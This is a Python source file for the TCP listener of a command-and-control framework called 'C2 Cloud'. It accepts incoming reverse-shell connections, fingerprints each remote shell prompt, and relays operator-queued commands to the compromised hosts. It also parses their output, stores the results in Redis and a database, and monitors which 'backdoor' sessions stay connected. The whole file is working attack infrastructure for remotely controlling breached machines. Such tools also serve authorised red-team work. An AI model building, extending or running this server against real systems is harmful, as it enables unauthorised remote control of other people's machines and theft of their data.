# C2 Cloud
#
# Author: Arun Govindasamy

import json
import re
import time
import socket
import base64
import copy
import threading
from datetime import datetime
from collections import OrderedDict
from libs.redisOperations import RedisOperations
from libs.dbOperations import DBOperations
from libs.common import Common
from libs.logger import init_logger

class C2TcpServer:
    def __init__(self, app):
        # flask app object 
        self.app = app
        # Common library 
        self.common = Common()
        self.tcp_server_ip = self.common.tcp_server_ip
        self.tcp_server_port = self.common.tcp_server_port
        self.tcp_socket_buffer_size = self.common.tcp_socket_buffer_size
        self.redis_channel_session = self.common.redis_channel_session
        self.redis_channel_payload = self.common.redis_channel_payload
        # store client connections
        self.clients = {}
        # to store current active session ids 
        # to handle service restart 
        self.active_session_ids = []
        # Create a Redis client
        self.redis_client = RedisOperations()
        # Create DB client
        self.db_client = DBOperations()
        # Max retry count for command execution 
        self.max_retry_count = self.common.tcp_max_retry_count
        # logger
        self.logger_instance = init_logger('C2_Cloud')

    # TCP server setup
    def tcp_server(self):
        # Create a TCP socket
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.tcp_server_ip, self.tcp_server_port))
        server.listen(5)

        self.logger_instance.info(f"[*] Listening on {self.tcp_server_ip}:{self.tcp_server_port}")

        # monitor heartbeat 
        threading.Thread(target=self.heartbeat, args=()).start()

        while True:
            # Accept incoming connections
            client, addr = server.accept()
            session_id = self.common.generate_random_id()
            # Handle each client in a separate thread
            threading.Thread(target=self.command_control, args=(client, addr, session_id)).start()

    def receiver(self, function_name, client_socket, string_match, session_id, epoch):
        try:
            # set to non-blocking mode 
            client_socket.setblocking(0)
            output = ""
            while True:
                if session_id in self.clients:
                    new_epoch = datetime.utcnow()
                    time_diff = abs(new_epoch - epoch).total_seconds()
                    try:
                        response = client_socket.recv(self.tcp_socket_buffer_size).decode('utf-8', 'ignore')
                        output = output + response
                        response = response.replace('\r', '').replace('\n', '')
                        shell_count = response.count(string_match)
                        self.logger_instance.info(f"receiver - Received from client {session_id}, function_name: {function_name}, response: {repr(response)}, output: {repr(output)}, shell_count: {shell_count}")
                        if shell_count >= 1:
                            # send response
                            self.logger_instance.info(f"receiver - Received from client {session_id}, function_name: {function_name}, output: {repr(output)}")
                            return {"status": "success", "message": output}
                    except BlockingIOError:
                        pass
                    except socket.error as e:
                        self.logger_instance.info(f"receiver - session_id: {session_id} socket disconnected")
                        if session_id in self.clients:
                            del self.clients[session_id]
                        self.active_session_ids.remove(session_id)
                        return {"status": "disconnected", "message": ""}
                    if time_diff > 1:
                        self.logger_instance.info(f"receiver - timed out {session_id}, function_name: {function_name}, epoch: {epoch}, new_epoch: {new_epoch}, time_diff: {time_diff}, output: {repr(output)}")
                        return {"status": "timedout", "message": output}
                else:
                    self.logger_instance.info(f"receiver - session_id: {session_id} not found")
                    return {"status": "disconnected", "message": ""}
        except KeyboardInterrupt:
            self.logger_instance.info(f"receiver - keyboardInterrupt: stopping data reception")
            if session_id in self.clients:
                del self.clients[session_id]
            return {"status": "disconnected", "message": ""}
        except Exception as e:
            self.logger_instance.info(f"receiver - error occurred: {e}")
            if session_id in self.clients:
                del self.clients[session_id]
            return {"status": "disconnected", "message": ""}

    def monitor_client(self, client_socket, addr, session_id):
        self.logger_instance.info(f'monitor_client')
        while True:
            try:
                session_key = "session_details_" + session_id
                session_data = self.redis_client.get_data(session_key)
                break
            except Exception as e:
                pass
        while True:
            try:
                data = client_socket.recv(64)
                
                if not data:
                    self.logger_instance.info(f"monitor_client - client disconnected. session_id: {session_id}")
                    del self.clients[session_id]
                    client_socket.close()
                    # Close the client socket after handling
                    if session_data:
                        session_data["status"] = "Disconnected"
                    self.active_session_ids.remove(session_id)
                    self.redis_client.write_session_data(session_key, session_data)
                    self.redis_client.publish_message(self.redis_channel_session, json.dumps(session_data))
                    with self.app.app_context():
                        self.db_client.write_session_data(session_data)
                    break  # exit the loop when client disconnects
            except BlockingIOError:
                time.sleep(1)
                continue
            except Exception as e:
                self.logger_instance.info(f"monitor_client - error occurred: {e}")
                break  # exit the loop on any exception

    def heartbeat(self):
        self.logger_instance.info(f'heartbeat')
        while True:
            try:
                # to control disconnected status messages are writtent to redis and db 
                flag=False
                queryString = "*" # all records 
                session_data = self.redis_client.get_session_records(queryString)
                if session_data:
                    for data in session_data:
                        data = json.loads(data)
                        session_id = data["session_id"]
                        session_type = data["session_type"]
                        status = data["status"]
                        session_key = "session_details_" + session_id
                        # monitor tcp sessions 
                        if session_type == "tcp" and status == "Connected":
                            try:
                                client_socket = self.clients[session_id]
                                # send a small amount of data to the client
                                client_socket.send(b'')
                                flag=False
                                self.logger_instance.info(f"heartbeat - session_id: {session_id} connected")
                            except socket.error:
                                data["status"] = "Disconnected"
                                flag=True
                                self.logger_instance.info(f"heartbeat - session_id: {session_id} disconnected")
                            except Exception as e:
                                data["status"] = "Disconnected"
                                flag=True
                                self.logger_instance.info(f"heartbeat - session_id: {session_id} disconnected error: {e}")
                        if flag:
                            flag=False
                            self.logger_instance.info(f"heartbeat - flag: modified_data: {data}")
                            if session_id in self.clients:
                                del self.clients[session_id]
                            if session_id in self.active_session_ids:
                                self.active_session_ids.remove(session_id)
                            self.redis_client.write_session_data(session_key, data)
                            self.redis_client.publish_message(self.redis_channel_session, json.dumps(data))
                            with self.app.app_context():
                                self.db_client.write_session_data(data)
            except Exception as e:
                self.logger_instance.info(f"heartbeat exception - error occured: {e}")
                pass
            time.sleep(60)

    def receiver_hc(self, function_name, client_socket, session_id, epoch):
        # this function is to capture the initial response to identify the shell value
        try:
            # set to non-blocking mode
            client_socket.setblocking(0)
            # to track the number of iterations 
            count = 1
            output = ""
            while True:
                #if session_id in self.clients:
                new_epoch = datetime.utcnow()
                # identify time difference 
                time_diff = abs(new_epoch - epoch).total_seconds()
                try:
                    response = client_socket.recv(self.tcp_socket_buffer_size).decode('utf-8', 'ignore')
                    output = output + response
                    new_epoch = datetime.utcnow()
                    self.logger_instance.info(f"receiver - Received from client {session_id}, function_name: {function_name}, count: {count}, epoch: {epoch}, new_epoch: {new_epoch}, time_diff: {time_diff}, response: {repr(response)}, output: {repr(output)}")
                    if count >= 5:
                        # allow only 5 iterations 
                        self.logger_instance.info(f"receiver - Received from client {session_id}, output: {repr(output)}")
                        return {"status": "success", "message": output}
                    count = count +1
                except BlockingIOError:
                    pass
                except socket.error as e:
                    self.logger_instance.info(f"receiver - session_id: {session_id} socket disconnected")
                    if session_id in self.clients:
                        del self.clients[session_id]
                    self.active_session_ids.remove(session_id)
                    return {"status": "disconnected", "message": ""}
                if time_diff > 1:
                    # receiver time out more than 1 sec 
                    self.logger_instance.info(f"receiver - timed out {session_id} function_name: {function_name}, count: {count}, epoch: {epoch}, new_epoch: {new_epoch}, time_diff: {time_diff}, output: {repr(output)}")
                    return {"status": "timedout", "message": output}
        except KeyboardInterrupt:
            self.logger_instance.info("receiver - keyboardinterrupt: stopping data reception")
            if session_id in self.clients:
                del self.clients[session_id]
            return {"status": "disconnected", "message": ""}
        except Exception as e:
            self.logger_instance.info(f"receiver - error occurred: {e}")
            if session_id in self.clients:
                del self.clients[session_id]
            return {"status": "disconnected", "message": ""}

    def capture_shell(self, message):
        # to parse the data 
        _shell = ""
        remove_ascii_chars = re.sub(r'[\x00-\x1f\x7f-\x9f]\]\d\;.*?[\x00-\x1f\x7f-\x9f]', '', message) # bash 
        regex_match = re.findall(r'[\x00-\x1f\x7f-\x9f]\[\?\d+[a-z](.*)echo \"Hello World\"', remove_ascii_chars)
        self.logger_instance.info(f'capture_shell - message: {message}, remove_ascii_chars: {remove_ascii_chars}, regex_match: {regex_match}')
        if regex_match:
            _shell = "".join(regex_match)
        elif message.count("echo") >= 1 and message.count("Hello World") >= 2:
            temp_message = message.replace('echo', '')
            temp_message = temp_message.replace('Hello World', '')
            temp_message = temp_message.replace('"', '')
            temp_message = temp_message.replace('\r', '')
            temp_message = temp_message.replace('\n', '')
            _shell = temp_message
        elif message.count("echo") == 0 and message.count("Hello World") == 1:
            _shell = "$"
        else:
            pass
        _shell = re.sub(r'[\x00-\x1f\x7f-\x9f]\[\?\d+[a-z]', '', _shell)
        _shell = re.sub(r'[\x00-\x1f\x7f-\x9f](\[|\()(\d+)?(\;)?(\d+)?[a-zA-Z]', '', _shell)
        _shell = re.sub(r'[\x00-\x1f\x7f-\x9f]\]0\;.*?\x07', '', _shell)
        _shell = re.sub(r'[\x00-\x1f\x7f-\x9f]\]0\;', '', _shell) # bash \x1b]0;root@ip-172-31-3-41:~\x07
        _shell = re.sub(r'\x07', '', _shell)
        # to filter duplicate shell values 
        strings = _shell.split()
        identical_strings = OrderedDict()
        for string in strings:
            if strings.count(string) > 1:
                identical_strings[string] = None
        self.logger_instance.info(f"capture_shell - _shell: {repr(_shell)}, strings: {repr(strings)}, identical_strings: {repr(identical_strings)}")
        if identical_strings:
            _temp = ""
            for string in identical_strings.keys():
                _temp = _temp + " " + string
            _shell = _temp
        shell = _shell.strip()
        self.logger_instance.info(f"capture_shell - shell: {repr(shell)}")
        return shell

    def init_session(self, session_id, client_socket, addr, shell):
        self.logger_instance.info(f"init_session")
        dt = self.common.current_datetime()
        # store commands 
        # remove once it is processed 
        commands_fifo_list = []
        session_key = "session_details_" + session_id
        self.clients[session_id] = client_socket
        session_data = {"session_id": session_id, "session_type": "tcp", "os_type": "unix", "created_at": dt, "host_name": addr[0], "port": addr[1], "status": "Connected", "shell": shell, "user_name": "", "commands": commands_fifo_list}
        self.active_session_ids.append(session_id)
        try:
            self.redis_client.publish_message(self.redis_channel_session, json.dumps(session_data))
            self.redis_client.write_session_data(session_key, session_data)
            with self.app.app_context():
                self.db_client.write_session_data(session_data)
        except Exception as e:
            self.logger_instance.info(f"init_session - failed to update the storage, error: {e}")
        del commands_fifo_list
        return

    # function to handle each client separately
    def handle_client(self, client_socket, addr, session_id):
        self.logger_instance.info(f"handle_client - session_id: {session_id}")
        command = 'echo "Hello World"'
        function_name = "handle_client"
        shell = ""
        retry_count = 0
        session_key = "session_details_" + session_id
        session_data = self.redis_client.get_data(session_key)
        client_socket.sendall('{}\n'.format(command).encode('utf-8'))
        while True:
            try:
                retry_count = retry_count + 1
                epoch = datetime.utcnow()
                receiver_response = self.receiver_hc(function_name, client_socket, session_id, epoch)
                self.logger_instance.info(f"handle_client - session_id: {session_id} receiver_response: {repr(receiver_response)}")
                if retry_count > self.max_retry_count:
                    self.logger_instance.info(f'handle_client - retry_count: {retry_count} exceeded')
                    retry_count = 0
                    return {"status": "error", "shell": "NA"}
                if receiver_response["status"] == "success":
                    shell = self.capture_shell(receiver_response["message"])
                    session_data["shell"] = shell
                    #self.redis_client.write_session_data(session_key, session_data)
                    self.init_session(session_id, client_socket, addr, shell)
                    self.logger_instance.info(f"handle_client - session_id: {session_id} shell: {repr(shell)}")
                    return {"status": "success", "shell": shell}
                elif receiver_response["status"] == "disconnected":
                    self.logger_instance.info(f"handle_client - session_id: {session_id} disconnected")
                    return {"status": "disconnected", "shell": "NA"}
                elif receiver_response["status"] == "timedout":
                    self.logger_instance.info(f"handle_client - session_id: {session_id} timedout")
                    shell = self.capture_shell(receiver_response["message"])
                    if shell:
                        session_data["shell"] = shell
                        self.init_session(session_id, client_socket, addr, shell)
                        self.logger_instance.info(f"handle_client - timedout, shell: {repr(shell)}")
                        return {"status": "success", "shell": shell}
                    else:
                        self.logger_instance.info(f"handle_client - timedout, shell: NA, message: retry")
                        client_socket.sendall('{}\n'.format(command).encode('utf-8'))
                else:
                    self.logger_instance.info(f"handle_client - error")
                    return {"status": "error", "shell": "NA"}
            except ConnectionResetError:
                self.logger_instance.info(f'handle_client - connectionreseterror, session_id: {session_id}, clients: {self.clients}')
                # close the client socket after handling
                session_data["status"] = "Disconnected"
                self.active_session_ids.remove(session_id)
                self.redis_client.publish_message(self.redis_channel_session, json.dumps(session_data))
                self.redis_client.write_session_data(session_key, session_data)
                with self.app.app_context():
                    self.db_client.write_session_data(session_data)
                del self.clients[session_id]
                client_socket.close()
                self.logger_instance.info(f"[*] connection closed for session_id: {session_id}")
                return {"status": "disconnected", "shell": "NA"}

    def cleanup_response(self, message, command, shell):
        # parse the response 
        output = re.sub(r'[\x00-\x1f\x7f-\x9f]\[\?\d+[a-z]', '', message)
        output = re.sub(r'^\s*' + re.escape(command), '', output)
        output = re.sub(r'\s*$', '', output)
        # \x1b[K \x1b[0m \x1b[01;34m \x1b(B \x1b[m
        output = re.sub(r'[\x00-\x1f\x7f-\x9f](\[|\()(\d+)?(\;)?(\d+)?[a-zA-Z]', '', output)
        output = re.sub(r'[\x00-\x1f\x7f-\x9f]\]0\;.*', '', output) # \x1b]0;root@ip-172-31-3-41:~\x07
        output = re.sub(r'\x07', '', output)
        if re.search(r'[^\w\s]$', shell) and shell.count(':') == 1:
            change_directory_pattern = re.findall(r'\:\s?(.*?)[^\w\s]$', shell)[0]
            new_shell_pattern = shell.replace(change_directory_pattern, '(.*?)')
            output = re.sub(new_shell_pattern, '', output)
        else:
            output = re.sub(re.escape(shell) + r'$', '', output)
        output = output.lstrip(command)
        output = output.rstrip(shell)
        self.logger_instance.info(f"cleanup_response - command: {command}, shell: {shell}, output: {repr(output)}")
        return output

    def command_control(self, client_socket, addr, session_id):
        self.logger_instance.info(f"command_control - session_id: {session_id}")
        handle_client_response = self.handle_client(client_socket, addr, session_id)
        self.logger_instance.info(f"command_control - session_id: {session_id}, handle_client_response: {handle_client_response}")
        if handle_client_response["status"] == "success":
            threading.Thread(target=self.monitor_client, args=(client_socket, addr, session_id)).start()
            # process if shell value is identified 
            shell = handle_client_response["shell"]
            function_name = "command_control"
            string_match = shell
            # retry count to control the command execution 
            retry_count = 0
            while True:
                if session_id in self.clients:
                    try:
                        session_key = "session_details_" + session_id
                        session_data = self.redis_client.get_data(session_key)
                        commands = session_data["commands"]
                        existing_commands = copy.deepcopy(commands)
                        # get first command 
                        data = commands.pop(0)
                        command = base64.b64decode(data["command"]).decode("utf-8")
                        payload = f'{command}\n'.encode("utf-8")
                        self.logger_instance.info(f"command_control - command: {repr(command)}, payload: {payload}, commands: {commands}, len_commands: {len(commands)}, retry_count: {retry_count}")
                        if command:
                            client_socket.sendall(payload)
                            while True:
                                epoch = datetime.utcnow()
                                if retry_count > self.max_retry_count:
                                    self.logger_instance.info(f'command_control - retry_count: {retry_count} exceeded')
                                    retry_count = 0
                                    response = base64.b64encode('Timed out'.encode('utf-8')).decode('utf-8')
                                    payload_key = "payload_details_" + session_id
                                    payload_data = {"session_id": session_id, "shell": shell, "command": data["command"], "command_date": data["command_date"], "response": response, "response_date": dt}
                                    self.logger_instance.info(f'command_control - timed out, retry_count: {retry_count} - payload_key: {payload_key}, payload_data: {payload_data}')
                                    try:
                                        self.redis_client.publish_message(self.redis_channel_payload, json.dumps(payload_data))
                                        self.redis_client.write_payload_data(payload_key, payload_data)
                                        with self.app.app_context():
                                            self.db_client.write_payload_data(payload_data)
                                    except Exception as e:
                                        self.logger_instance.info(f'command_control - failed to update redis or db, error: {e}')
                                    break
                                else:
                                    receiver_response = self.receiver(function_name, client_socket, string_match, session_id, epoch)
                                    self.logger_instance.info(f"command_control - session_id: {session_id}, receiver_response: {receiver_response}")
                                    if receiver_response["status"] == "success":
                                        output = self.cleanup_response(receiver_response["message"], command, shell)
                                        self.logger_instance.info(f"command_control - output: {repr(output)}")
                                        dt = self.common.current_datetime()
                                        if output is not None:
                                            response = base64.b64encode(output.encode('utf-8')).decode('utf-8')
                                        else:
                                            response = base64.b64encode("Time out".encode('utf-8')).decode('utf-8')
                                        payload_key = "payload_details_" + session_id
                                        payload_data = {"session_id": session_id, "shell": shell, "command": data["command"], "command_date": data["command_date"], "response": response, "response_date": dt}
                                        try:
                                            self.redis_client.publish_message(self.redis_channel_payload, json.dumps(payload_data))
                                            self.redis_client.write_payload_data(payload_key, payload_data)
                                            with self.app.app_context():
                                                self.db_client.write_payload_data(payload_data)
                                        except Exception as e:
                                            self.logger_instance.info(f'command_control - failed to update redis or db, error: {e}')
                                        break
                                    elif receiver_response["status"] == "timedout":
                                        # repeated - should be merged with receiver_response["status"] == success
                                        retry_count = 0
                                        output = self.cleanup_response(receiver_response["message"], command, shell)
                                        self.logger_instance.info(f"command_control - timedout, session_id: {session_id} timedout  retry_count: {retry_count}, output: {repr(output)}")
                                        dt = self.common.current_datetime()
                                        if output is not None:
                                            response = base64.b64encode(output.encode('utf-8')).decode('utf-8')
                                        else:
                                            response = base64.b64encode("Time out".encode('utf-8')).decode('utf-8')
                                        payload_key = "payload_details_" + session_id
                                        payload_data = {"session_id": session_id, "shell": shell, "command": data["command"], "command_date": data["command_date"], "response": response, "response_date": dt}
                                        self.logger_instance.info(f'command_control - timed out, redis_payload_key: {payload_key}, payload_data: {payload_data}')
                                        try:
                                            self.redis_client.publish_message(self.redis_channel_payload, json.dumps(payload_data))
                                            self.redis_client.write_payload_data(payload_key, payload_data)
                                            with self.app.app_context():
                                                self.db_client.write_payload_data(payload_data)
                                        except Exception as e:
                                            self.logger_instance.info(f'command_control - failed to update redis or db, error: {e}')
                                        break
                                    else:
                                        self.logger_instance.info(f"command_control - session_id: {session_id} NA")
                                        break
                            try:
                                # to handle new commands received during processing of the first command 
                                self.logger_instance.info(f'command_control - update redis or db with new commands')
                                update_session_data = self.redis_client.get_data(session_key)
                                new_commands = update_session_data["commands"]
                                diff = [item for item in new_commands if item not in existing_commands]
                                # update redis session data
                                update_session_data["commands"] = commands + diff
                                self.logger_instance.info(f"command_control - new_commands: {new_commands}, existing_commands: {existing_commands}, diff: {diff}, session_key: {session_key}, session_data: {update_session_data}")
                                self.redis_client.write_session_data(session_key, update_session_data)
                                with self.app.app_context():
                                    self.db_client.write_session_data(update_session_data)
                            except Exception as e:
                                self.logger_instance.info(f"command_control - error occured: {e}")
                    except Exception as e:
                        pass
                else:
                    self.logger_instance.info(f"receiver - session_id: {session_id} not found")
                    return
        else:
            self.logger_instance.info(f"Not a valid backdoor session, message: {handle_client_response}")
            client_socket.close()
            return
